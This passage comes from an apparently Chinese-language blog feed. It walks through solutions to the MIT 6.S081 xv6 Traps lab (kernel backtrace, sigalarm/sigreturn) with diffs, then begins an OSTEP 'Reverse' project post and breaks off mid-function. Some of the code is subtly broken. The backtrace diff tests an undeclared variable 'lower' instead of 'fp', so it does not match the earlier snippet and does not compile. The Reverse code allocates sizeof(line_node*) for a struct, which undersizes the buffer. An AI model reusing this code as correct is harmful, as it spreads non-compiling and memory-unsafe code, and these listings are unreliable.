<p>关键问题是 <strong>什么时候停止</strong> ？可以看到上述 backtrace 的过程就好像是在遍历一个链表，当链表的 <code>next</code> 域为空指针时链表到达末尾，那 traceback 完成后<code>fp</code> 的值应该是什么？为了寻找这个问题的答案，我选择先不设置终止条件，让它一直向上搜索，最后发现，返回地址最终为一个很小的值，这个地址显然不是我们想要的，在此之前应该退出，即本次 traceback 的尽头是 0x80001c92.</p>
<p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/noterm.png"></p>
<p>但打印出来的函数调用的返回地址似乎并没有什么规律，因此我又尝试将遍历过程中的栈帧起始地址 <code>fp</code> 打印出来，得到以下结果：</p>
<p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/pfp.png"></p>
<p>结合提示：</p>
<blockquote>
<p>Xv6 allocates one page for each stack in the xv6 kernel at PAGE-aligned address.</p>
</blockquote>
<p>原因就很明显了，在打印第三个返回地址时，此时栈帧起始地址为 0x3fffffa000，注意该地址后 12 二进制数为 0，且页面大小为 4KB，因此该地址位于一个页面的起始地址。又因为 xv6 内核只为每个 <strong>内核栈</strong> 分配一个页面的存储空间，该页面的起始地址按页面大小对齐，所以此时已经到达一个内核栈的顶端，无需继续遍历。</p>
<p>弄清楚了这些，代码的编写就很简单了：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">backtrace</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"backtrace:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    uint64 fp <span class="token operator">=</span> <span class="token function">r_fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    uint64 top <span class="token operator">=</span> <span class="token function">PGROUNDUP</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>uint64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>fp <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fp <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>uint64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>fp <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>fp <span class="token operator">&lt;</span> top<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// reach the top of kernel stack</span>
<span class="token punctuation">&#125;</span></code></pre>

<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff"><span class="token coord">--- a/kernel/defs.h</span>
<span class="token coord">+++ b/kernel/defs.h</span>
@@ -80,6 +80,7 @@ int             pipewrite(struct pipe*, uint64, int);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void            printf(char*, ...);
</span><span class="token prefix unchanged"> </span><span class="token line">void            panic(char*) __attribute__((noreturn));
</span><span class="token prefix unchanged"> </span><span class="token line">void            printfinit(void);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">void			backtrace(void); // here
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// proc.c
</span><span class="token prefix unchanged"> </span><span class="token line">int             cpuid(void);
</span></span>diff --git a/kernel/printf.c b/kernel/printf.c
index e1347de..a068cbd 100644
<span class="token coord">--- a/kernel/printf.c</span>
<span class="token coord">+++ b/kernel/printf.c</span>
@@ -114,6 +114,23 @@ printf(char *fmt, ...)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    release(&amp;pr.lock);
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">// here
</span><span class="token prefix inserted">+</span><span class="token line">void backtrace(void) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	printf("backtrace:\n");
</span><span class="token prefix inserted">+</span><span class="token line">	uint64 fp = r_fp();
</span><span class="token prefix inserted">+</span><span class="token line">	uint64 top = PGROUNDUP(fp);
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">	do &#123;
</span><span class="token prefix inserted">+</span><span class="token line">		printf("%p\n", *(uint64 *)(fp - 8));
</span><span class="token prefix inserted">+</span><span class="token line">		fp = *(uint64 *)(fp - 16);
</span><span class="token prefix inserted">+</span><span class="token line">	&#125; while (lower &lt; top);
</span><span class="token prefix inserted">+</span><span class="token line">&#125;
</span><span class="token prefix inserted">+</span><span class="token line">
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void
</span><span class="token prefix unchanged"> </span><span class="token line">panic(char *s)
</span><span class="token prefix unchanged"> </span><span class="token line">&#123;
</span></span>diff --git a/kernel/riscv.h b/kernel/riscv.h
index 1691faf..fae7bf3 100644
<span class="token coord">--- a/kernel/riscv.h</span>
<span class="token coord">+++ b/kernel/riscv.h</span>
@@ -331,6 +331,15 @@ sfence_vma()
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  asm volatile("sfence.vma zero, zero");
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">// here
</span><span class="token prefix inserted">+</span><span class="token line">static inline uint64
</span><span class="token prefix inserted">+</span><span class="token line">r_fp()
</span><span class="token prefix inserted">+</span><span class="token line">&#123;
</span><span class="token prefix inserted">+</span><span class="token line">  uint64 x;
</span><span class="token prefix inserted">+</span><span class="token line">  asm volatile("mv %0, s0" : "=r" (x) );
</span><span class="token prefix inserted">+</span><span class="token line">  return x;
</span><span class="token prefix inserted">+</span><span class="token line">&#125;
</span><span class="token prefix inserted">+</span><span class="token line">
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">#define PGSIZE 4096 // bytes per page
</span><span class="token prefix unchanged"> </span><span class="token line">#define PGSHIFT 12  // bits of offset within a page
</span></span>diff --git a/kernel/sysproc.c b/kernel/sysproc.c
index e8bcda9..f27c007 100644
<span class="token coord">--- a/kernel/sysproc.c</span>
<span class="token coord">+++ b/kernel/sysproc.c</span>
@@ -70,6 +70,7 @@ sys_sleep(void)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    sleep(&amp;ticks, &amp;tickslock);
</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;
</span><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;tickslock);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  backtrace(); // here
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  return 0;
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span></code></pre>

<h1 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>目前为止感觉最复杂的一题，需要对 trap 机制有一个比较深入的理解，建议在上手之前先仔细阅读与 trap 有关的代码：<code>kernel/trampoline.S</code> 和 <code>kernel/trap.c</code>，这里也推荐一位博主写的两篇有关 xv6 的 trap 机制的博客：</p>
<p><a href="https://blog.csdn.net/zzy980511/article/details/130255251">6.S081——陷阱部分(一文读懂xv6系统调用)——xv6源码完全解析系列(5)</a></p>
<p><a href="https://blog.csdn.net/zzy980511/article/details/130642258">6.S081——补充材料——RISC-V架构中的异常与中断详解</a></p>
<h3 id="test0-invoke-handler"><a href="#test0-invoke-handler" class="headerlink" title="test0: invoke handler"></a>test0: invoke handler</h3><p>我们不妨按照提示的顺序来进行，不关注 <code>sys_sigreturn</code>，先把 <code>sys_sigalarm</code> 的功能实现。</p>
<p>实际上，<code>sys_sigalarm</code> 函数的功能很简单，只是简单地将用户态下传递的参数 <code>ticks</code> 和 <code>handler</code> 存入进程的 <code>struct proc</code> 结构体中。实现调用 <code>handler</code> 的操作需要在内核态下的 <code>usertrap</code> 中完成，具体来说，针对时钟中断导致的 trap 将在 <code>if(which_dev == 2)</code> 后的语句中被处理。有两个目标需要完成： <strong>定时</strong> 和 <strong>函数调用</strong> 。</p>
<p>定时的逻辑比较清楚，在 <code>struct proc</code> 中添加变量 <code>ticksum</code>，代表从上次 <code>handler</code> 处理完成开始进程累计的时钟中断次数，该变量在进程初始化时设置为 0，随后每次遇到时钟中断，都自增 1，如果自增后的值达到了设定的间隔 <code>ticks</code>，则将其复位为 0，调用 <code>handler</code> 函数。</p>
<p>函数调用是一个需要考虑的问题，这里不能直接利用函数指针 <code>handler</code> 进行函数调用，因为 <code>handler</code> 指向的函数位于用户空间下，而 <code>usertrap</code> 位于内核态下，页表的地址映射不同，无法直接根据用户空间下的虚拟地址进行寻址（直接调用引发的错误如下图所示），需要在本次中断结束返回到用户态之后执行。因此正确的做法应该是设置进程 <code>struct proc</code> 的 <code>epc</code> 寄存器为函数指针 <code>handler</code>，这样在中断处理完成，进程回到用户态并被 CPU 调度执行后，寄存器 <code>pc</code> 将被设置预先保存的 <code>epc</code> 的值，这样函数 <code>handler</code> 就被成功调度执行了。至此，test0 应该成功通过。</p>
<p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/nil.png"></p>
<p>在进入到 test1&amp;2 之前，有必要说一说我的一些思考：在上面的讨论中，我们知道内核无法直接根据函数指针 <code>handler</code> 的值进行用户空间函数的调用，那能否在内核态下根据进程的用户态页表和给定的虚拟地址，利用软件地址转换机制（<code>vm.c</code> 中的 <code>walkaddr</code> 函数）来将用户空间的虚拟地址转换为物理地址进行寻址呢（这也是我最开始的想法）？答案是不行，因为即便是在内核态下，程序中的地址仍然是虚拟地址，也就是说即便知道用户态函数实际存储的物理地址，我们也只有在 <strong>给出一个虚拟地址，该虚拟地址经过内核页表地址转换之后，刚好得到了正确的物理地址，</strong> 才可能成功。而实际上，尽管内核 <code>KERNBASE</code> 到 <code>PHYSTOP</code> 地址都是直接映射，但内核页表中可能并没有所需要的页表项，因此，这并不会成功。</p>
<h3 id="test1-test2-resume-interrupted-code"><a href="#test1-test2-resume-interrupted-code" class="headerlink" title="test1/test2(): resume interrupted code"></a>test1/test2(): resume interrupted code</h3><p>test1 的目标是，存储和恢复中断处理前后的寄存器状态。那么问题就来了：为什么需要存储这些寄存器？需要存储哪些寄存器？</p>
<p>其实最开始，我是有些纠结寄存器状态的存储目的是什么，认为可能是与内核态和用户态切换有关，但仔细想想，这部分的工作应该是由 <code>trampoline.S</code> 和 <code>usertrapret</code> 来完成的，那么为什么还需要存储和恢复寄存器？</p>
<p>事实上，在系统未关闭中断的情况下，时钟中断可能在程序执行的任何时刻发生，且在返回到原程序位置继续执行之前还需要执行预先设定好的 <code>handler</code> 函数，那么寄存器状态的保存将是必要的。一方面在执行 <code>handler</code> 函数期间，如果 <code>handler</code> 函数包含一些对局部变量的处理，那么通用寄存器的值将会发生改变，从而使得中断返回时程序的执行结果与预期不符；另一方面，由于 <code>epc</code> 的值被手动改变，如果执行完 <code>handler</code> 之后不恢复中断发生时的保存的 <code>pc</code> 值，那么 <code>pc</code> 将会指向 <code>handler</code> 函数末尾的下一条指令，中断因此无法正常返回。 简单来说，这部分的操作相当于手动模拟了 <strong>线程</strong> 的切换。</p>
<p>另一个问题是：需要存储哪些寄存器？好吧，在解决这个 Lab 时我其实偷了点懒，没有去仔细琢磨，只是简单地将整个 <code>trapframe</code> 中所有的寄存器都保存下来。但根据上面的讨论，再结合 RISC-V 的 <em>calling convention</em>，应该不难得出答案。</p>
<p>最后的 test2 就比较简单了，目标是：</p>
<blockquote>
<p>Prevent re-entrant calls to the handler—-if a handler hasn’t returned yet, the kernel shouldn’t call it again.</p>
</blockquote>
<p>解决的办法有很多，可以额外在 <code>strcut proc</code> 添加一个变量，用来表示进程当前是否正处在处理 <code>handler</code> 的过程中，如果是，则不进行 <code>ticksum</code> 的自增操作。这里我采用了一点 <strong>小技巧</strong> ：不添加额外的变量，而是在处理 <code>handler</code> 前将 <code>ticksum</code> 置为负数，并在自增前判断 <code>ticksum</code> 是否非负，在 <code>sys_sigreturn</code> 时再将它置为 0，本质上与添加变量的操作大差不差。</p>
<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefile
index 7a7e380..bc4d47a 100644
<span class="token coord">--- a/Makefile</span>
<span class="token coord">+++ b/Makefile</span>
@@ -188,6 +188,7 @@ UPROGS=\
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">	$U/_grind\
</span><span class="token prefix unchanged"> </span><span class="token line">	$U/_wc\
</span><span class="token prefix unchanged"> </span><span class="token line">	$U/_zombie\
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">	$U/_alarmtest\
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span></span>diff --git a/kernel/proc.c b/kernel/proc.c
index 22e7ce4..80096f7 100644
<span class="token coord">--- a/kernel/proc.c</span>
<span class="token coord">+++ b/kernel/proc.c</span>
@@ -119,6 +119,7 @@ allocproc(void)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">found:
</span><span class="token prefix unchanged"> </span><span class="token line">  p->pid = allocpid();
</span><span class="token prefix unchanged"> </span><span class="token line">  p->state = USED;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  p->ticksum = 0; // here
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">  // Allocate a trapframe page.
</span><span class="token prefix unchanged"> </span><span class="token line">  if((p->trapframe = (struct trapframe *)kalloc()) == 0)&#123;
</span></span>diff --git a/kernel/proc.h b/kernel/proc.h
index f6ca8b7..c1d5a23 100644
<span class="token coord">--- a/kernel/proc.h</span>
<span class="token coord">+++ b/kernel/proc.h</span>
@@ -105,4 +105,10 @@ struct proc &#123;
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  struct file *ofile[NOFILE];  // Open files
</span><span class="token prefix unchanged"> </span><span class="token line">  struct inode *cwd;           // Current directory
</span><span class="token prefix unchanged"> </span><span class="token line">  char name[16];               // Process name (debugging)
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">  int ticks;         // here
</span><span class="token prefix inserted">+</span><span class="token line">  void (*handler)();
</span><span class="token prefix inserted">+</span><span class="token line">  int ticksum;
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">  struct trapframe strapframe;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;
</span></span>diff --git a/kernel/syscall.c b/kernel/syscall.c
index c1b3670..d4e5585 100644
<span class="token coord">--- a/kernel/syscall.c</span>
<span class="token coord">+++ b/kernel/syscall.c</span>
@@ -104,6 +104,8 @@ extern uint64 sys_unlink(void);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_wait(void);
</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);
</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_sigalarm(void); // here
</span><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_sigreturn(void);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;
</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,
</span></span>@@ -127,6 +129,8 @@ static uint64 (*syscalls[])(void) = &#123;
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_link]    sys_link,
</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,
</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_sigalarm]  sys_sigalarm,  // here
</span><span class="token prefix inserted">+</span><span class="token line">[SYS_sigreturn] sys_sigreturn,
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">void
</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.h
index bc5f356..a040610 100644
<span class="token coord">--- a/kernel/syscall.h</span>
<span class="token coord">+++ b/kernel/syscall.h</span>
<span class="token coord">@@ -20,3 +20,5 @@</span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19
</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20
</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_sigalarm  22  // here
</span><span class="token prefix inserted">+</span><span class="token line">#define SYS_sigreturn 23
</span></span>diff --git a/kernel/sysproc.c b/kernel/sysproc.c
index f27c007..ee859ed 100644
<span class="token coord">--- a/kernel/sysproc.c</span>
<span class="token coord">+++ b/kernel/sysproc.c</span>
@@ -96,3 +96,28 @@ sys_uptime(void)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;tickslock);
</span><span class="token prefix unchanged"> </span><span class="token line">  return xticks;
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">// here
</span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_sigalarm(void) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	struct proc *p = myproc();
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">	if (argint(0, &amp;(p->ticks)) &lt; 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">		return -1;
</span><span class="token prefix inserted">+</span><span class="token line">	&#125;
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">	if (argaddr(1, (uint64 *)&amp;(p->handler)) &lt; 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">		return -1;
</span><span class="token prefix inserted">+</span><span class="token line">	&#125;
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">	return 0;
</span><span class="token prefix inserted">+</span><span class="token line">&#125;
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_sigreturn(void) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	struct proc *p = myproc();
</span><span class="token prefix inserted">+</span><span class="token line">	
</span><span class="token prefix inserted">+</span><span class="token line">	// restore registers
</span><span class="token prefix inserted">+</span><span class="token line">	memmove(p->trapframe, &amp;(p->strapframe), sizeof(p->strapframe));
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">	p->ticksum = 0;
</span><span class="token prefix inserted">+</span><span class="token line">	return 0;
</span><span class="token prefix inserted">+</span><span class="token line">&#125;
</span></span>diff --git a/kernel/trap.c b/kernel/trap.c
index a63249e..447e6d8 100644
<span class="token coord">--- a/kernel/trap.c</span>
<span class="token coord">+++ b/kernel/trap.c</span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span></span>@@ -77,8 +77,17 @@ usertrap(void)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    exit(-1);
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">  // give up the CPU if this is a timer interrupt.
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  if(which_dev == 2)
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if(which_dev == 2) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	// here
</span><span class="token prefix inserted">+</span><span class="token line">	if (p->ticks > 0 &amp;&amp; p->ticksum >= 0 &amp;&amp; ++(p->ticksum) >= p->ticks) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	  // save registers
</span><span class="token prefix inserted">+</span><span class="token line">	  memmove(&amp;(p->strapframe), p->trapframe, sizeof(p->strapframe));
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">	  p->ticksum = -1; // prevent re-entrant calls to the handler
</span><span class="token prefix inserted">+</span><span class="token line">	  p->trapframe->epc = (uint64)p->handler;
</span><span class="token prefix inserted">+</span><span class="token line">	&#125;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    yield();
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">  usertrapret();
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span></span>diff --git a/user/user.h b/user/user.h
index b71ecda..422a4c1 100644
<span class="token coord">--- a/user/user.h</span>
<span class="token coord">+++ b/user/user.h</span>
@@ -23,6 +23,8 @@ int getpid(void);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">char* sbrk(int);
</span><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);
</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int sigalarm(int ticks, void (*handler)()); // here
</span><span class="token prefix inserted">+</span><span class="token line">int sigreturn(void);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c
</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);
</span></span>diff --git a/user/usys.pl b/user/usys.pl
index 01e426e..84c6784 100755
<span class="token coord">--- a/user/usys.pl</span>
<span class="token coord">+++ b/user/usys.pl</span>
@@ -36,3 +36,5 @@ entry("getpid");
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");
</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");
</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("sigalarm"); # here
</span><span class="token prefix inserted">+</span><span class="token line">entry("sigreturn");</span></span></code></pre>

]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>经验</tag>
        <tag>操作系统</tag>
        <tag>xv6</tag>
      </tags>
  </entry>
  <entry>
    <title>OSTEP Projects：Reverse</title>
    <url>/2024/05/06/OSTEP%20Projects%EF%BC%9AReverse/</url>
    <content><![CDATA[<p>本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关<a href="https://github.com/remzi-arpacidusseau/ostep-projects">课程项目</a> 的 Reverse 部分，包含个人的代码实现和设计思路。</p>
<span id="more"></span>

<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>题目的要求很简单：按行读取数据，读取完成后将所读取到的所有行反向输出（行间反向，行内不变）。但代码实现上却包含不少细节。</p>
<p>首先是核心问题：如何将读取到行反向输出？首先可以确定的一点是：<strong>在所有行读取完成之前，读取到的每一个行都需要进行保存。</strong>那么，利用什么数据结构进行保存呢？我们需要这个数据结构能够确定输入的不同行之间的前后相对关系，因此想到使用<strong>线性表</strong>。由于最终读取到的行数是不确定的，因此不能使用一个固定大小的数组，而应该使用可变长的线性表，如链表、动态数组。而又因为可变数组的扩容操作比较耗时，且我们并不需要对元素进行随机访问，只需要最后输出的时候进行顺序遍历，因此链表就成为了最佳选择。</p>
<p>反转的具体实现可以参考经典问题<a href="https://leetcode.cn/problems/reverse-linked-list/">反转链表</a>，设定一个前驱结点 pre 和当前结点 cur，每次读取到新的行，就动态申请存储该行数据的内存空间，并将 cur 指向这块内存空间，然后将 cur 的 next 域指向 pre，然后 pre 再指向 cur，以便进行下一行的操作。</p>
<p>根据 README 的说明，当输入文件和输出文件是同一个文件时，程序打印相关错误信息并退出。这里一个简单的想法是使用 <code>strcmp(argv[1], argv[2])</code> 判断两个参数字符串是否相同，但文件路径的表示方式并不是唯一的，如 <code>./t1.txt</code> 和 <code>t1.txt</code> 字符串不同，但表示的却是同一个文件。一个正确的做法是使用 <code>stat()</code> 函数，用以获取文件的状态信息，并对比输入与输出文件的状态信息是否相同。</p>
<p>最后，输入输出部分代码的实现可以封装为一个函数，并引入参数 <code>FILE*</code>，其中标准输入（<code>stdin</code>）和标准输出（<code>stdout</code>）可以看作是一个抽象的文件，并使用 <code>fprintf()</code> 进行文件写入。</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">LineNode</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">char</span><span class="token operator">*</span> line_buf<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">LineNode</span><span class="token operator">*</span> next<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> line_node<span class="token punctuation">;</span>

<span class="token comment">// 判断两个路径是否表示同一个文件</span>
<span class="token keyword">int</span> <span class="token function">is_same_file</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> file1<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> file2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">struct</span> <span class="token class-name">stat</span> sb1<span class="token punctuation">,</span> sb2<span class="token punctuation">;</span>
	<span class="token function">stat</span><span class="token punctuation">(</span>file1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sb1<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">stat</span><span class="token punctuation">(</span>file2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sb2<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> sb1<span class="token punctuation">.</span>st_dev <span class="token operator">==</span> sb2<span class="token punctuation">.</span>st_dev <span class="token operator">&amp;&amp;</span> sb1<span class="token punctuation">.</span>st_ino <span class="token operator">==</span> sb2<span class="token punctuation">.</span>st_ino<span class="token punctuation">;</span> <span class="token comment">// 设备ID和inode号均相同</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 从文件fp中读取行数据</span>
line_node<span class="token operator">*</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>FILE<span class="token operator">*</span> fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	line_node<span class="token operator">*</span> cur <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// 当前结点</span>
	line_node<span class="token operator">*</span> pre <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// 前置结点</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		cur <span class="token operator">=</span> <span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
